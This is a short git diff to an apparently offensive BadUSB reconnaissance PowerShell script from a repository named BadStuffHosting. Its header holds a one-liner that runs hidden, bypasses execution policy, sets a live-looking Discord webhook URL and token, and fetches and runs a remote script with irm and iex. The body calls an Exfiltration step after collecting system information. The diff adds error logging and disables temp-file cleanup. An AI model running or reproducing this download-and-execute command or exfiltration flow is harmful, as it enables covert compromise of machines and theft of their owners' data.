@@ -4,7 +4,7 @@ OneLiner to Invoke Feature_Testing :
 powershell -w h -NoP -Ep Bypass -c "$DiscordUrl='https://discord.com/api/webhooks/1200825365074026656/II57HCGRJAOJmEplqOjdz3xuZC70d2v9aJvU1OfX2BK_c7SQHfk9R9ZZdIf9F_RQ4LFX';$db='';(irm https://raw.githubusercontent.com/Gvte-Kali/BadStuffHosting/main/BadUSB/4dv4nc3d_R3c0n/Feature_Testing.ps1) | iex"
 
 #>
-
+try {
 
 # Function to handle the temporary directory
 function TempDir {
@@ -293,4 +293,7 @@ $outputPath = Join-Path $env:TEMP "SystemInfo.txt"
 Exfiltration
 
 #Call DelTempDir
-DelTempDir
+#DelTempDir
+} catch {
+    $_ | Out-File -Append -FilePath "C:\Temp\Errors.txt"
+}
